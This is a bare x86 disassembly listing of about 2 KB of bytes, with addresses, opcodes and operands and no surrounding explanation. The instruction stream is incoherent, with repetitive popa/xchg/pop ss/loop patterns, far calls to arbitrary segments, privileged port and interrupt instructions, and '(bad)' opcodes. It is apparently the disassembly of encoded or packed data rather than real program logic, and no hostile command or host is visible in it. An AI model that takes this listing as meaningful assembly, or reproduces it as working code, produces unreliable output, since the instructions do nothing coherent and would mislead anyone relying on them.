  430714:	bound  esp,QWORD PTR [edx+0x14]
  430717:	push   cs
  430718:	push   ecx
  430719:	popa   
  43071a:	popa   
  43071b:	xchg   esp,eax
  43071c:	pop    ss
  43071d:	loop   0x430735
  43071f:	pop    esp
  430720:	bound  esp,QWORD PTR [edx+0x14]
  430723:	sbb    DWORD PTR [edx],eax
  430725:	popa   
  430726:	popa   
  430727:	xchg   esp,eax
  430728:	pop    ss
  430729:	loop   0x43071e
  43072b:	pop    esp
  43072c:	bound  esp,QWORD PTR [edx+0x14]
  43072f:	sbb    DWORD PTR [ebx+0x17946161],ebx
  430735:	loop   0x430728
  430737:	pop    esp
  430738:	bound  esp,QWORD PTR [edx+0x14]
  43073b:	pushf  
  43073c:	int3   
  43073d:	popa   
  43073e:	popa   
  43073f:	xchg   esp,eax
  430740:	pop    ss
  430741:	loop   0x4307a7
  430743:	pop    esp
  430744:	bound  esp,QWORD PTR [edx+0x14]
  430747:	jp     0x430715
  430749:	popa   
  43074a:	popa   
  43074b:	xchg   esp,eax
  43074c:	pop    ss
  43074d:	loop   0x4307c5
  43074f:	arpl   WORD PTR [edx+0x62],sp
  430752:	adc    al,0x34
  430754:	int3   
  430755:	popa   
  430756:	popa   
  430757:	xchg   esp,eax
  430758:	pop    ss
  430759:	loop   0x4307d7
  43075b:	arpl   WORD PTR [edx+0x62],sp
  43075e:	adc    al,0xe3
  430760:	int3   
  430761:	popa   
  430762:	popa   
  430763:	xchg   esp,eax
  430764:	pop    ss
  430765:	loop   0x430762
  430767:	arpl   WORD PTR [edx+0x62],sp
  43076a:	adc    al,0xaa
  43076c:	int3   
  43076d:	popa   
  43076e:	popa   
  43076f:	xchg   esp,eax
  430770:	pop    ss
  430771:	loop   0x4307eb
  430773:	arpl   WORD PTR [edx+0x62],sp
  430776:	adc    al,0xe4
  430778:	shl    DWORD PTR [ecx+0x61],cl
  43077b:	xchg   esp,eax
  43077c:	pop    ss
  43077d:	loop   0x43070d
  43077f:	arpl   WORD PTR [edx+0x62],sp
  430782:	adc    al,0xa1
  430784:	int3   
  430785:	popa   
  430786:	popa   
  430787:	xchg   esp,eax
  430788:	pop    ss
  430789:	loop   0x43075f
  43078b:	arpl   WORD PTR [edx+0x62],sp
  43078e:	adc    al,0xe6
  430790:	int3   
  430791:	popa   
  430792:	popa   
  430793:	xchg   esp,eax
  430794:	pop    ss
  430795:	loop   0x4307cf
  430797:	arpl   WORD PTR [edx+0x62],sp
  43079a:	adc    al,0xa3
  43079c:	int3   
  43079d:	popa   
  43079e:	popa   
  43079f:	xchg   esp,eax
  4307a0:	pop    ss
  4307a1:	loop   0x4307d1
  4307a3:	arpl   WORD PTR [edx+0x62],sp
  4307a6:	adc    al,0x34
  4307a8:	int3   
  4307a9:	popa   
  4307aa:	popa   
  4307ab:	xchg   esp,eax
  4307ac:	pop    ss
  4307ad:	loop   0x430755
  4307af:	arpl   WORD PTR [edx+0x62],sp
  4307b2:	adc    al,0x96
  4307b4:	int3   
  4307b5:	popa   
  4307b6:	popa   
  4307b7:	xchg   esp,eax
  4307b8:	pop    ss
  4307b9:	loop   0x4307ed
  4307bb:	arpl   WORD PTR [edx+0x62],sp
  4307be:	adc    al,0x69
  4307c0:	add    BYTE PTR [ecx+0x61],ah
  4307c3:	xchg   esp,eax
  4307c4:	pop    ss
  4307c5:	loop   0x430839
  4307c7:	arpl   WORD PTR [edx+0x62],sp
  4307ca:	adc    al,0xe5
  4307cc:	adc    esp,DWORD PTR [ecx+0x61]
  4307cf:	xchg   esp,eax
  4307d0:	pop    ss
  4307d1:	loop   0x43077b
  4307d3:	arpl   WORD PTR [edx+0x62],sp
  4307d6:	adc    al,0x70
  4307d8:	es popa 
  4307da:	popa   
  4307db:	xchg   esp,eax
  4307dc:	pop    ss
  4307dd:	loop   0x43077d
  4307df:	arpl   WORD PTR [edx+0x62],sp
  4307e2:	adc    al,0xe
  4307e4:	push   ecx
  4307e5:	popa   
  4307e6:	popa   
  4307e7:	xchg   esp,eax
  4307e8:	pop    ss
  4307e9:	loop   0x43076f
  4307eb:	arpl   WORD PTR [edx+0x62],sp
  4307ee:	adc    al,0x19
  4307f0:	add    ah,BYTE PTR [ecx+0x61]
  4307f3:	xchg   esp,eax
  4307f4:	pop    ss
  4307f5:	loop   0x4307a1
  4307f7:	arpl   WORD PTR [edx+0x62],sp
  4307fa:	adc    al,0x19
  4307fc:	fwait
  4307fd:	popa   
  4307fe:	popa   
  4307ff:	xchg   esp,eax
  430800:	pop    ss
  430801:	loop   0x4307a3
  430803:	arpl   WORD PTR [edx+0x62],sp
  430806:	adc    al,0x9c
  430808:	int3   
  430809:	popa   
  43080a:	popa   
  43080b:	xchg   esp,eax
  43080c:	pop    ss
  43080d:	loop   0x4307a5
  43080f:	arpl   WORD PTR [edx+0x62],sp
  430812:	or     eax,0xb858675
  430817:	call   0xa8e8:0x5e343ac9
  43081e:	popa   
  43081f:	pop    ss
  430820:	loop   0x430882
  430822:	pop    esp
  430823:	bound  esp,QWORD PTR [edx-0x12]
  430826:	xchg   DWORD PTR ds:0xb858675,ecx
  43082c:	call   0x5c60:0x130d3ac9
  430833:	bound  esp,QWORD PTR [edx+0x13]
  430836:	outs   dx,BYTE PTR ds:[esi]
  430837:	push   0x61a8e85e
  43083c:	pop    ss
  43083d:	loop   0x43089f
  43083f:	pop    esp
  430840:	bound  esp,QWORD PTR [edx+0xd]
  430843:	jne    0x4307cb
  430845:	test   DWORD PTR [ebx],ecx
  430847:	call   0xa873:0x56343ac9
  43084e:	popa   
  43084f:	mov    eax,ds:0x625c60e2
  430854:	bound  esi,QWORD PTR [ebx+0x75]
  430857:	or     eax,0xb858675
  43085c:	call   0xa8e8:0x5e343ac9
  430863:	popa   
  430864:	or     eax,0x625c6013
  430869:	bound  ebp,QWORD PTR ds:0x6e069360
  43086f:	lea    edi,[esi-0x7a9d9d9d]
  430875:	fsub   DWORD PTR [ecx+0x61]
  430878:	popa   
  430879:	fcomp  DWORD PTR [edx+ebx*4]
  43087c:	or     eax,0x6fd686cd
  430881:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430887:	pop    esi
  430888:	call   0xe4506a35
  43088d:	pusha  
  43088e:	pop    esp
  43088f:	bound  esp,QWORD PTR [edx+0x2d]
  430892:	dec    edi
  430893:	add    al,0x6e
  430895:	imul   edi,DWORD PTR [esi-0x119d9d9d],0xd
  43089c:	or     eax,0xb858675
  4308a1:	call   0xa8e8:0x5e343ac9
  4308a8:	popa   
  4308a9:	pop    ss
  4308aa:	loop   0x4308c0
  4308ac:	arpl   WORD PTR [edx+0x62],sp
  4308af:	or     eax,0xb859a75
  4308b4:	call   0x63be:0x13133ac9
  4308bb:	bound  esp,QWORD PTR [edx+0x17]
  4308be:	adc    dl,ah
  4308c0:	and    al,0x4e
  4308c2:	push   edi
  4308c3:	popa   
  4308c4:	fcomp  DWORD PTR [ebx+0x31]
  4308c7:	pop    esp
  4308c8:	bound  esp,QWORD PTR [edx+0x61]
  4308cb:	adc    al,0x71
  4308cd:	int3   
  4308ce:	popa   
  4308cf:	popa   
  4308d0:	xchg   esp,eax
  4308d1:	pop    ss
  4308d2:	loop   0x430931
  4308d4:	pop    esp
  4308d5:	bound  esp,QWORD PTR [edx+0x14]
  4308d8:	(bad)
  4308db:	popa   
  4308dc:	xchg   esp,eax
  4308dd:	pop    ss
  4308de:	loop   0x43092b
  4308e0:	pop    esp
  4308e1:	bound  esp,QWORD PTR [edx+0x14]
  4308e4:	pop    es
  4308e5:	shl    DWORD PTR [ecx+0x61],cl
  4308e8:	xchg   esp,eax
  4308e9:	pop    ss
  4308ea:	loop   0x430955
  4308ec:	pop    esp
  4308ed:	bound  esp,QWORD PTR [edx+0x14]
  4308f0:	out    dx,eax
  4308f1:	shl    DWORD PTR [ecx+0x61],cl
  4308f4:	xchg   esp,eax
  4308f5:	pop    ss
  4308f6:	loop   0x43095f
  4308f8:	pop    esp
  4308f9:	bound  esp,QWORD PTR [edx+0x14]
  4308fc:	jmp    0x94a46ad4
  430901:	pop    ss
  430902:	loop   0x430959
  430904:	pop    esp
  430905:	bound  esp,QWORD PTR [edx+0x14]
  430908:	or     eax,0x946161d3
  43090d:	pop    ss
  43090e:	loop   0x430973
  430910:	pop    esp
  430911:	bound  esp,QWORD PTR [edx+0x14]
  430914:	(bad)  
  430916:	popa   
  430917:	popa   
  430918:	xchg   esp,eax
  430919:	pop    ss
  43091a:	loop   0x43097d
  43091c:	arpl   WORD PTR [edx+0x62],sp
  43091f:	adc    al,0x71
  430921:	int3   
  430922:	popa   
  430923:	popa   
  430924:	xchg   esp,eax
  430925:	pop    ss
  430926:	loop   0x430987
  430928:	arpl   WORD PTR [edx+0x62],sp
  43092b:	adc    al,0x34
  43092d:	int3   
  43092e:	popa   
  43092f:	popa   
  430930:	xchg   esp,eax
  430931:	pop    ss
  430932:	loop   0x43092b
  430934:	arpl   WORD PTR [edx+0x62],sp
  430937:	adc    al,0x13
  430939:	shl    DWORD PTR [ecx+0x61],cl
  43093c:	xchg   esp,eax
  43093d:	pop    ss
  43093e:	loop   0x4308e2
  430940:	arpl   WORD PTR [edx+0x62],sp
  430943:	adc    al,0xc5
  430945:	int3   
  430946:	popa   
  430947:	popa   
  430948:	xchg   esp,eax
  430949:	pop    ss
  43094a:	loop   0x4308e4
  43094c:	arpl   WORD PTR [edx+0x62],sp
  43094f:	adc    al,0xdd
  430951:	int3   
  430952:	popa   
  430953:	popa   
  430954:	xchg   esp,eax
  430955:	pop    ss
  430956:	loop   0x430984
  430958:	arpl   WORD PTR [edx+0x62],sp
  43095b:	adc    al,0xc5
  43095d:	int3   
  43095e:	popa   
  43095f:	popa   
  430960:	xchg   esp,eax
  430961:	pop    ss
  430962:	loop   0x4309d8
  430964:	arpl   WORD PTR [edx+0x62],sp
  430967:	adc    al,0xe7
  430969:	int3   
  43096a:	popa   
  43096b:	popa   
  43096c:	xchg   esp,eax
  43096d:	pop    ss
  43096e:	loop   0x43094a
  430970:	arpl   WORD PTR [edx+0x62],sp
  430973:	adc    al,0x7b
  430975:	int3   
  430976:	popa   
  430977:	popa   
  430978:	xchg   esp,eax
  430979:	pop    ss
  43097a:	loop   0x43094c
  43097c:	arpl   WORD PTR [edx+0x62],sp
  43097f:	adc    al,0xb8
  430981:	int3   
  430982:	popa   
  430983:	popa   
  430984:	xchg   esp,eax
  430985:	pop    ss
  430986:	loop   0x43094e
  430988:	arpl   WORD PTR [edx+0x62],sp
  43098b:	adc    al,0x13
  43098d:	shl    DWORD PTR [ecx+0x61],cl
  430990:	xchg   esp,eax
  430991:	pop    ss
  430992:	loop   0x430960
  430994:	arpl   WORD PTR [edx+0x62],sp
  430997:	adc    al,0x34
  430999:	int3   
  43099a:	popa   
  43099b:	popa   
  43099c:	xchg   esp,eax
  43099d:	pop    ss
  43099e:	loop   0x430972
  4309a0:	arpl   WORD PTR [edx+0x62],sp
  4309a3:	or     eax,0xb859a75
  4309a8:	call   0x8475:0x6e133ac9
  4309af:	sbb    dh,cl
  4309b1:	popa   
  4309b2:	pop    ss
  4309b3:	loop   0x4309d1
  4309b5:	pop    esp
  4309b6:	bound  esp,QWORD PTR [edx+0xd]
  4309b9:	jne    0x430955
  4309bb:	test   DWORD PTR [ebx],ecx
  4309bd:	call   0xa8e8:0x5e343ac9
  4309c4:	popa   
  4309c5:	or     eax,0x625c1c13
  4309ca:	bound  edx,QWORD PTR [ebx+0x60af91f2]
  4309d0:	or     eax,0x625c1ce2
  4309d5:	bound  edx,QWORD PTR [edi+edx*1-0x658af266]
  4309dc:	test   DWORD PTR [ebx],ecx
  4309de:	call   0xf175:0x6e133ac9
  4309e5:	xor    eax,0xe21761ce
  4309ea:	and    BYTE PTR [edx+eiz*2+0x62],bl
  4309ee:	or     eax,0xb859a75
  4309f3:	call   0xa8e8:0x5e343ac9
  4309fa:	popa   
  4309fb:	or     eax,0x625c2013
  430a00:	bound  edx,QWORD PTR [ebx+0x60af91f2]
  430a06:	or     eax,0x625c20e2
  430a0b:	bound  edx,QWORD PTR [edi+edx*1-0x658af266]
  430a12:	test   DWORD PTR [ebx],ecx
  430a14:	call   0xa8e8:0x5e343ac9
  430a1b:	popa   
  430a1c:	or     eax,0x6fd69acd
  430a21:	or     ebx,DWORD PTR [edx+0x17943ac9]
  430a27:	outs   dx,BYTE PTR ds:[esi]
  430a28:	int    0xc8
  430a2a:	sbb    dh,cl
  430a2c:	popa   
  430a2d:	or     eax,0xb859a75
  430a32:	call   0xa8e8:0x5e343ac9
  430a39:	popa   
  430a3a:	or     eax,0x6fd69acd
  430a3f:	or     ebx,DWORD PTR [edx+0x17943ac9]
  430a45:	outs   dx,BYTE PTR ds:[esi]
  430a46:	int    0x63
  430a48:	xor    eax,0x750d61ce
  430a4d:	xchg   BYTE PTR [ebp+0x3ac99a0b],al
  430a53:	or     eax,0x6fd686cd
  430a58:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  430a5e:	call   0xe217:0x61ce1b4b
  430a65:	adc    al,0x63
  430a67:	bound  esp,QWORD PTR [edx+0xd]
  430a6a:	jne    0x430a06
  430a6c:	test   DWORD PTR [ebx],ecx
  430a6e:	call   0x63b6:0x13133ac9
  430a75:	bound  esp,QWORD PTR [edx+0x17]
  430a78:	adc    dl,ah
  430a7a:	and    al,0x4e
  430a7c:	push   edi
  430a7d:	popa   
  430a7e:	jo     0x430ae1
  430a80:	bound  esi,QWORD PTR [edx-0x5d1dec72]
  430a86:	arpl   WORD PTR [edx+0x62],sp
  430a89:	shl    bl,cl
  430a8b:	jp     0x430a55
  430a8d:	popa   
  430a8e:	popa   
  430a8f:	or     eax,0x6fd686cd
  430a94:	or     ebx,DWORD PTR [edx+0x6e173ac9]
  430a9a:	adc    esp,DWORD PTR [esi+ecx*2]
  430a9d:	push   edi
  430a9e:	popa   
  430a9f:	or     eax,0xb859a75
  430aa4:	call   0xa8e8:0x5e343ac9
  430aab:	popa   
  430aac:	mov    eax,ds:0x625c31e2
  430ab1:	(bad)  
  430ab2:	out    0x2,eax
  430ab4:	adc    esp,edx
  430ab6:	adc    al,0x63
  430ab8:	bound  esp,QWORD PTR [edx-0x2e]
  430abb:	or     eax,0xb858675
  430ac0:	call   0xa8e8:0x5e343ac9
  430ac7:	popa   
  430ac8:	rcl    BYTE PTR [ebx],cl
  430aca:	loop   0x430b42
  430acc:	arpl   WORD PTR [edx+0x62],sp
  430acf:	shl    BYTE PTR [edx+0xb],cl
  430ad2:	xor    DWORD PTR [edx+eiz*2+0x62],ebx
  430ad6:	or     eax,0x58629275
  430adb:	or     eax,0xb859a75
  430ae0:	call   0x639a:0x13133ac9
  430ae7:	bound  esp,QWORD PTR [edx+0x17]
  430aea:	adc    dl,ah
  430aec:	and    al,0x4e
  430aee:	push   edi
  430aef:	popa   
  430af0:	jo     0x430b53
  430af2:	bound  esi,QWORD PTR [edx+0x5de2138e]
  430af8:	pop    esp
  430af9:	bound  esp,QWORD PTR [edx-0x2e]
  430afc:	repz dec ebx
  430afe:	leave  
  430aff:	popa   
  430b00:	popa   
  430b01:	or     eax,0x6fd686cd
  430b06:	or     ebx,DWORD PTR [edx+0x6e173ac9]
  430b0c:	adc    esp,DWORD PTR [esi+ecx*2]
  430b0f:	push   edi
  430b10:	popa   
  430b11:	adc    esp,edx
  430b13:	fbld   TBYTE PTR [edx+0x62]
  430b16:	bound  edx,QWORD PTR [edi]
  430b18:	loop   0x430b22
  430b1a:	arpl   WORD PTR [edx+0x62],sp
  430b1d:	bound  ecx,QWORD PTR [ebx]
  430b1f:	out    0x62,eax
  430b21:	bound  esp,QWORD PTR [edx+0x62]
  430b24:	mov    dl,0xfb
  430b26:	bound  esi,QWORD PTR [edx-0x754d9d8a]
  430b2c:	bound  esi,QWORD PTR [edx-0x6d4d9d82]
  430b32:	bound  esi,QWORD PTR [edx-0x794d9d66]
  430b38:	repz dec ebx
  430b3a:	xor    esp,DWORD PTR [ecx+0x61]
  430b3d:	or     eax,0x62630813
  430b42:	bound  edx,QWORD PTR [edi]
  430b44:	push   0x859a750d
  430b49:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  430b4f:	call   0xe2ea6cfc
  430b54:	fbld   TBYTE PTR [edx+0x62]
  430b57:	bound  edx,QWORD PTR [ebx+0x61610e6e]
  430b5d:	popa   
  430b5e:	adc    esi,DWORD PTR [ebp-0x9]
  430b61:	pop    ss
  430b62:	loop   0x430b5d
  430b64:	pop    esp
  430b65:	bound  esp,QWORD PTR [edx+0xd]
  430b68:	loop   0x430b51
  430b6a:	bound  esp,QWORD PTR [edx+0x62]
  430b6d:	push   esi
  430b6e:	loop   0x430b4f
  430b70:	bound  esp,QWORD PTR [edx+0x62]
  430b73:	pop    ss
  430b74:	loop   0x430b5d
  430b76:	bound  esp,QWORD PTR [edx+0x62]
  430b79:	bound  ecx,QWORD PTR [ebx]
  430b7b:	out    0x62,eax
  430b7d:	bound  esp,QWORD PTR [edx-0xd]
  430b80:	aaa    
  430b81:	cmp    ah,BYTE PTR [ecx+0x61]
  430b84:	or     eax,0xb859a75
  430b89:	call   0xa8e8:0x5e343ac9
  430b90:	popa   
  430b91:	or     eax,0x6262e713
  430b96:	bound  ecx,QWORD PTR ds:0x61686017
  430b9c:	popa   
  430b9d:	or     eax,0xb6fd691
  430ba2:	call   0xe85e:0x1fd63ac9
  430ba9:	test   al,0x61
  430bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430bac:	pop    ds
  430bad:	mov    dl,0x83
  430baf:	or     eax,0x6262e7e2
  430bb4:	bound  ecx,QWORD PTR ds:0x61684cdb
  430bba:	popa   
  430bbb:	bound  esi,QWORD PTR [edx+0xd]
  430bbe:	loop   0x430ba7
  430bc0:	bound  esp,QWORD PTR [edx+0x62]
  430bc3:	or     eax,0x616848db
  430bc8:	popa   
  430bc9:	(bad)  
  430bcb:	cmp    dh,ch
  430bcd:	jl     0x430bdc
  430bcf:	loop   0x430bb8
  430bd1:	bound  esp,QWORD PTR [edx+0x62]
  430bd4:	or     eax,0x6168dfdb
  430bd9:	popa   
  430bda:	or     eax,0x625cf913
  430bdf:	bound  ecx,QWORD PTR ds:0xd9a5691
  430be5:	loop   0x430be0
  430be7:	pop    esp
  430be8:	bound  esp,QWORD PTR [edx+0x17]
  430beb:	call   0x6262:0x62e7e20d
  430bf2:	xor    al,0x3c
  430bf4:	push   0xe2176161
  430bf9:	adc    al,0x5c
  430bfb:	bound  esp,QWORD PTR [edx+0xd]
  430bfe:	loop   0x430c14
  430c00:	pop    esp
  430c01:	bound  esp,QWORD PTR [edx+0xd]
  430c04:	popa   
  430c05:	or     eax,0xe217da61
  430c0a:	or     BYTE PTR [edx+eiz*2+0x62],bl
  430c0e:	or     eax,0x625c14e2
  430c13:	bound  ecx,QWORD PTR ds:0x8130d61
  430c19:	pop    esp
  430c1a:	bound  esp,QWORD PTR [edx+0x17]
  430c1d:	call   0x6262:0x62e7e20d
  430c24:	or     eax,0x616850db
  430c29:	popa   
  430c2a:	or     eax,0x625c0813
  430c2f:	bound  edx,QWORD PTR [ebx]
  430c31:	test   DWORD PTR [edi+edx*1],0x625cade2
  430c38:	bound  ecx,QWORD PTR ds:0x625cade2
  430c3e:	bound  ecx,QWORD PTR ds:0xe7130d61
  430c44:	bound  esp,QWORD PTR [edx+0x62]
  430c47:	or     eax,0x6168df17
  430c4c:	popa   
  430c4d:	or     eax,0xd685661
  430c52:	adc    ebp,DWORD PTR [ebp+0xd62625c]
  430c58:	xchg   ecx,eax
  430c59:	pop    ss
  430c5a:	push   0x61fb2257
  430c5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430c60:	or     eax,0xc664d864
  430c65:	and    DWORD PTR [ebp+0x55],esi
  430c68:	lods   eax,DWORD PTR ds:[esi]
  430c69:	loop   0x430c6c
  430c6b:	imul   esp,DWORD PTR [ecx],0xe2256975
  430c71:	add    DWORD PTR [ecx+0xd],ebp
  430c74:	jne    0x430c10
  430c76:	or     eax,0x6fd655cd
  430c7b:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430c81:	pop    esi
  430c82:	call   0x1fea6e2f
  430c87:	mov    dl,0x8b
  430c89:	or     eax,0xb855575
  430c8e:	call   0xa8e8:0x5e343ac9
  430c95:	popa   
  430c96:	lock aad 0x5f
  430c99:	popa   
  430c9a:	popa   
  430c9b:	lock (bad) 
  430c9d:	pop    edi
  430c9e:	popa   
  430c9f:	popa   
  430ca0:	or     eax,0xcd0d8675
  430ca5:	push   ebp
  430ca6:	(bad)  
  430ca7:	outs   dx,DWORD PTR ds:[esi]
  430ca8:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430cae:	pop    esi
  430caf:	call   0x1fea6e5c
  430cb4:	xchg   ebx,eax
  430cb5:	outs   dx,BYTE PTR ds:[esi]
  430cb6:	icebp  
  430cb7:	push   0x750d6161
  430cbc:	xchg   edx,eax
  430cbd:	pop    ss
  430cbe:	jne    0x430cc8
  430cc0:	or     eax,0x75178675
  430cc5:	adc    al,0xd
  430cc7:	jne    0x430c63
  430cc9:	pop    ss
  430cca:	jne    0x430cec
  430ccc:	and    DWORD PTR [ebp-0xd],esi
  430ccf:	add    ah,dl
  430cd1:	add    DWORD PTR [ecx+0x21],ebp
  430cd4:	jne    0x430d07
  430cd6:	and    esp,edx
  430cd8:	add    DWORD PTR [ecx+0x21],ebp
  430cdb:	jne    0x430d25
  430cdd:	lods   eax,DWORD PTR ds:[esi]
  430cde:	loop   0x430ce1
  430ce0:	imul   esp,DWORD PTR [ecx],0xe2253c75
  430ce6:	add    DWORD PTR [ecx+0x21],ebp
  430ce9:	jne    0x430d48
  430ceb:	mov    bl,0xe2
  430ced:	add    DWORD PTR [ecx+0xd],ebp
  430cf0:	jne    0x430d2e
  430cf2:	test   DWORD PTR [ebx],ecx
  430cf4:	call   0xa8e8:0x5e343ac9
  430cfb:	popa   
  430cfc:	or     eax,0x602d14cd
  430d01:	pop    ss
  430d02:	int    0x64
  430d04:	and    DWORD PTR [ebp+0x18],esi
  430d07:	sub    edx,esp
  430d09:	add    DWORD PTR [ecx-0x2a],ebp
  430d0c:	jmp    0x9369:0x1e2ad5d
  430d13:	outs   dx,BYTE PTR ds:[esi]
  430d14:	sbb    ch,BYTE PTR [eax+0x61]
  430d17:	popa   
  430d18:	or     eax,0xb853c75
  430d1d:	call   0xd63c:0xcd0d3ac9
  430d24:	outs   dx,DWORD PTR ds:[esi]
  430d25:	or     ebx,DWORD PTR [edx+0x10133ac9]
  430d2b:	call   0x750d:0x61ce1b4b
  430d32:	fs scas eax,DWORD PTR es:[edi]
  430d34:	inc    esi
  430d35:	dec    edx
  430d36:	outs   dx,DWORD PTR ds:[esi]
  430d37:	or     eax,0xb855d75
  430d3c:	call   0xa8e8:0x5e343ac9
  430d43:	popa   
  430d44:	or     eax,0x6fd63ccd
  430d49:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430d4f:	pop    esi
  430d50:	call   0x1f706efd
  430d55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430d56:	pop    eax
  430d57:	xchg   ebx,eax
  430d58:	loop   0x430dab
  430d5a:	popa   
  430d5b:	popa   
  430d5c:	popa   
  430d5d:	or     eax,0x75562075
  430d62:	sbb    ah,BYTE PTR fs:[ecx+0x4]
  430d66:	jne    0x430d89
  430d68:	or     eax,0xb854875
  430d6d:	call   0xa8e8:0x5e343ac9
  430d74:	popa   
  430d75:	pop    ss
  430d76:	jne    0x430d94
  430d78:	out    dx,al
  430d79:	cmp    cl,BYTE PTR ds:0x17a21c75
  430d7f:	jne    0x430d9d
  430d81:	or     eax,0xb851875
  430d86:	call   0xa8e8:0x5e343ac9
  430d8d:	popa   
  430d8e:	mov    eax,ds:0xd2731c75
  430d93:	or     eax,0x5e331c75
  430d98:	call   0xbc86f45
  430d9d:	call   0xa550:0x66343ac9
  430da4:	fmul   QWORD PTR ds:0x2c171ccd
  430daa:	adc    esp,DWORD PTR [eax+0xd]
  430dad:	jne    0x430dcb
  430daf:	(bad)  
  430db0:	(bad)  
  430db2:	pusha  
  430db3:	cld    
  430db4:	dec    ebp
  430db5:	int3   
  430db6:	mov    es,ebp
  430db8:	imul   ecx,DWORD PTR ds:0x2c0d1c75,0xffffffe2
  430dbf:	pusha  
  430dc0:	xor    al,0x3c
  430dc2:	push   ebp
  430dc3:	xor    al,0xf7
  430dc5:	or     eax,0x2c171ccd
  430dca:	adc    esp,DWORD PTR [eax-0x12]
  430dcd:	(bad)  
  430dce:	or     eax,0x2c0d1c75
  430dd3:	loop   0x430e35
  430dd5:	xor    edi,DWORD PTR [eax+eiz*1]
  430dd8:	rcr    BYTE PTR [edi+0xd],cl
  430ddb:	int    0x1c
  430ddd:	pop    ss
  430dde:	sub    al,0x13
  430de0:	pusha  
  430de1:	out    dx,al
  430de2:	adc    eax,ebx
  430de4:	jmp    0x693:0x89b26108
  430deb:	jne    0x430e0e
  430ded:	test   eax,ebx
  430def:	popa   
  430df0:	popa   
  430df1:	popa   
  430df2:	fcomp  DWORD PTR [edx+ebx*4]
  430df5:	add    al,0x75
  430df7:	and    esi,ebp
  430df9:	xor    ecx,DWORD PTR ds:0xb85f375
  430dff:	call   0xa8e8:0x5e343ac9
  430e06:	popa   
  430e07:	xchg   ebx,eax
  430e08:	push   es
  430e09:	int    0x21
  430e0b:	sub    eax,0x21cd0460
  430e10:	or     eax,0x6fd631cd
  430e15:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430e1b:	pop    esi
  430e1c:	call   0x755d6fc9
  430e21:	and    DWORD PTR [esi+0x60],eax
  430e24:	add    al,0x75
  430e26:	and    DWORD PTR [edi+0x20750d1c],ebp
  430e2c:	push   esi
  430e2d:	jne    0x430e93
  430e2f:	sbb    cl,ch
  430e31:	and    DWORD PTR [edx+ebx*4],eax
  430e34:	or     eax,0x5e336475
  430e39:	call   0xbc86fe6
  430e3e:	call   0xb248:0x75a73ac9
  430e45:	cwde   
  430e46:	or     eax,0xb855d75
  430e4b:	call   0xa8e8:0x5e343ac9
  430e52:	popa   
  430e53:	or     eax,0x6fd63ccd
  430e58:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430e5e:	pop    esi
  430e5f:	call   0x1f70700c
  430e64:	xor    ebx,DWORD PTR [esi-0x18]
  430e67:	test   al,0x61
  430e69:	test   DWORD PTR [ebx],ecx
  430e6b:	call   0xd5d:0x75173ac9
  430e72:	jne    0x430eb0
  430e74:	test   DWORD PTR [ebx],ecx
  430e76:	call   0xa8e8:0x5e343ac9
  430e7d:	popa   
  430e7e:	or     eax,0x602d14cd
  430e83:	pop    ss
  430e84:	int    0x64
  430e86:	out    dx,al
  430e87:	imul   ecx,DWORD PTR ds:0xb853c75,0xffffff9a
  430e8e:	leave  
  430e8f:	cmp    dh,BYTE PTR [esi+ebx*2]
  430e92:	call   0xcd50703f
  430e97:	fs sub eax,0x64cd1760
  430e9d:	lock in eax,0x63
  430ea0:	bound  esp,QWORD PTR [edx-0x12]
  430ea3:	xchg   ebx,eax
  430ea4:	or     eax,0xb855575
  430ea9:	call   0xa8e8:0x5e343ac9
  430eb0:	popa   
  430eb1:	out    dx,al
  430eb2:	lea    ecx,ds:0xb856975
  430eb8:	call   0xa8e8:0x5e343ac9
  430ebf:	popa   
  430ec0:	push   edi
  430ec1:	and    al,BYTE PTR [esi-0x305b349f]
  430ec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430ec8:	or     eax,0x8e750d64
  430ecd:	push   0x55d23875
  430ed2:	or     eax,0xb2688ab2
  430ed7:	jbe    0x430e7d
  430ed9:	or     eax,0x12ac7eb2
  430ede:	enter  0xcc1a,0x63
  430ee2:	fsub   DWORD PTR [eax+0x62]
  430ee5:	inc    ebp
  430ee6:	dec    eax
  430ee7:	dec    edx
  430ee8:	pop    eax
  430ee9:	rcr    BYTE PTR [edx],cl
  430eeb:	push   edx
  430eec:	fsub   DWORD PTR [eax+0x62]
  430eef:	inc    ebp
  430ef0:	dec    eax
  430ef1:	dec    edx
  430ef2:	pop    eax
  430ef3:	rcr    BYTE PTR [edi+0x4e],cl
  430ef6:	or     eax,0x8664d863
  430efb:	sub    eax,0xd2d2a21c
  430f00:	rcl    dl,cl
  430f02:	ror    bl,cl
  430f04:	sub    eax,0x4dd8a44b
  430f09:	bound  edx,QWORD PTR [ecx+eiz*2]
  430f0c:	push   esi
  430f0d:	popa   
  430f0e:	popa   
  430f0f:	inc    ebp
  430f10:	dec    eax
  430f11:	adc    eax,DWORD PTR [esp+eax*4]
  430f14:	cmp    ah,BYTE PTR [ecx+0x61]
  430f17:	adc    al,0x61
  430f19:	mul    DWORD PTR [ecx-0x9]
  430f1c:	dec    edi
  430f1d:	lock gs scas al,BYTE PTR es:[edi]
  430f20:	jo     0x430f56
  430f22:	shl    ebx,0x16
  430f25:	pop    edi
  430f26:	popa   
  430f27:	popa   
  430f28:	xor    BYTE PTR ss:[ebx],dl
  430f2b:	test   BYTE PTR [ebx],dl
  430f2d:	mov    ds:0xd55ea0d,eax
  430f32:	jne    0x430f65
  430f34:	sub    eax,0x217f8eea
  430f39:	pop    ss
  430f3a:	jne    0x430f2f
  430f3c:	lods   eax,DWORD PTR ds:[esi]
  430f3d:	popa   
  430f3e:	repz xor eax,0x9361615f
  430f44:	loop   0x430f2a
  430f46:	popa   
  430f47:	popa   
  430f48:	popa   
  430f49:	sbb    cl,ch
  430f4b:	pop    ebp
  430f4c:	jg     0x430f38
  430f4e:	fs inc ebp
  430f50:	ret    0xf0db
  430f53:	call   0x56ca:0xed45474b
  430f5a:	arpl   WORD PTR [ebx+edx*1-0x3de0236a],di
